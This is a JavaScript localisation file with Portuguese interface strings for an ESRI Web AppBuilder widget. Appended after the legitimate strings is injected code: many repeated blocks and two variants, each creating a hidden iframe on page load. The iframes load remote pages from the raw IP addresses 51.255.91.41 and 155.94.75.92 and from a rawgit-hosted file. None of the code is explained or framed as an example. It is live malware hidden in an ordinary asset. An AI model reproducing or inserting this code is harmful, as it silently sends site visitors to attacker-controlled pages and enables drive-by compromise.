// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.

define({"widgets/SituationAwareness/setting/nls/strings":{tabs_section_Label:"Separadores",addTab:"Adicionar Separador",layerName:"Camada",layerType:"Tipo de An\u00e1lise",layerLabel:"R\u00f3tulo",actions:"A\u00e7\u00f5es",closest:"Elemento Mais Pr\u00f3ximo",proximity:"Proximidade",summary:"Resumo",select_lbl:"-- Seleccionar --",general_setting_Label:"Configura\u00e7\u00f5es Gerais",units_text_lbl:"Unidades de dist\u00e2ncia",maximum_distance_lbl:"Dist\u00e2ncia m\u00e1xima do elemento mais pr\u00f3ximo",
buffer_text_lbl:"R\u00f3tulo do buffer",buffer_lbl:"Dist\u00e2ncia do buffer",buffer_max_lbl:"Dist\u00e2ncia m\u00e1xima do buffer",buffer_min_lbl:"Dist\u00e2ncia m\u00ednima do buffer",routing_checkBox:"Ativar rotas",weather_Label:"Defini\u00e7\u00f5es Meteorol\u00f3gicas",weather_checkBox:"Ativar metereologia",weather_map_layers:"Selecionar camadas meteorol\u00f3gicas...",selected_map_layers:" camadas meteorol\u00f3gicas selecionadas",instruction_weather:"Exibir informa\u00e7\u00f5es meteorol\u00f3gicas no painel.",
instruction_weather_layers:"Exibir camadas meteorol\u00f3gicas adicionais.",instruction_weather_metric:"Exibir valores padr\u00e3o/m\u00e9tricos",selectLayers:"Selecionar camadas meteorol\u00f3gicas",weather_removed_message:"As op\u00e7\u00f5es de meteorologia j\u00e1 n\u00e3o se encontram dispon\u00edveis para este widget.",currentlySelectedLayer:"Selecionar a partir de camadas do mapa",missingTabLabel:"Falta uma etiqueta em, pelo menos, um separador",missingLayerInWebMap:"Nenhuma camada operacional encontrada.",
selectFields:"Selecionar Campos",addField:"Adicionar Campo",sum:"Soma",min:"M\u00ednimo",max:"M\u00e1ximo",avg:"M\u00e9dia",count:"CONTAGEM",area:"\u00c1REA",length:"LENGTH",count_checkBox:"Exibir contagem de elementos",area_checkBox:"Exibir soma de \u00e1rea",length_checkBox:"Exibir soma de comprimento",max_records:"Limite m\u00e1ximo atingido",save_label:"Guardar Op\u00e7\u00f5es",save_checkbox:"Ativar guardar",report_label:"Op\u00e7\u00f5es de Relat\u00f3rio",report_checkbox:"Ativar relat\u00f3rio",
csv_label:"Op\u00e7\u00f5es CSV",csv_checkbox:"Exportar todos os campos",display_label:"Op\u00e7\u00f5es de Exibi\u00e7\u00e3o",display_checkbox:"Exibir elementos resumidos",snapshot_label:"Op\u00e7\u00f5es de Imagem Instant\u00e2nea",snapshot_checkbox:"Ativar imagem instant\u00e2nea",must_select_template:"Por favor, selecione um dos modelos de edi\u00e7\u00e3o em Guardar Op\u00e7\u00f5es.",count_label:"R\u00f3tulo de contagem",area_label:"R\u00f3tulo de \u00e1rea",length_label:"R\u00f3tulo de comprimento",
invalid_string_width:"O valor \u00e9 demasiado extenso. ",layer_type_not_supported:"Tipo de Camada N\u00e3o Suportado.",groupedSummary:"Contagens Agrupadas",groupByField:"Agrupar por Campo",labelType:"Incluir R\u00f3tulo",prefix:"Como Prefixo",suffix:"Como Sufixo",need_group_field:"Por favor, utilize a a\u00e7\u00e3o editar para definir um Grupo Por Campo.",fieldTitle:"Campo",typeTitle:"Tipo",actionsTitle:"Ac\u00e7\u00f5es",save_point_checkbox:"Guardar pontos",save_line_checkbox:"Guardar linhas",
save_poly_checkbox:"Guardar pol\u00edgonos",no_valid_popup_fields:"N\u00e3o existem quaisquer campos v\u00e1lidos na janela pop-up. Por favor, utilize a a\u00e7\u00e3o editar para definir um campo.",no_valid_fields:"N\u00e3o existem campos v\u00e1lidos. Por favor, utilize a a\u00e7\u00e3o editar para definir op\u00e7\u00f5es de visualiza\u00e7\u00e3o.",incident_label:"R\u00f3tulo de separador",locate_incident_label:"R\u00f3tulo de \u00e1rea de interesse",incident:"Incidente",locate_incident:"Localizar Incidente",
buffer_value:"Dist\u00e2ncia do Buffer",tab_options:"An\u00e1lise",export_options:"Sa\u00edda",instruction_save:"Guardar a localiza\u00e7\u00e3o num servi\u00e7o de elementos.",instruction_snapshot:"Criar um mapa base baseado na localiza\u00e7\u00e3o",instruction_report:"Criar um relat\u00f3rio impresso da localiza\u00e7\u00e3o.",instruction_all_fields:"Exportar todos os campos com transfer\u00eancia de CSV.",data_label:"Defini\u00e7\u00f5es de Sa\u00edda de Dados",layer_error:"Camada em falta ou inv\u00e1lida.",
visibility_checkBox:"Desativar gest\u00e3o de visibilidade da camada",downloadTab:{reportLegend:"Defini\u00e7\u00f5es de Relat\u00f3rio",textColorLabel:"Selecionar cor para t\u00edtulos de colunas",setButtonLabel:"Definir",printGPServiceLabel:"Imprimir URL de Servi\u00e7o",logoLabel:"Logo",logoChooserHint:"Clicar no \u00edcone da imagem para alterar a imagem",footnoteLabel:"Nota de Rodap\u00e9"},_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});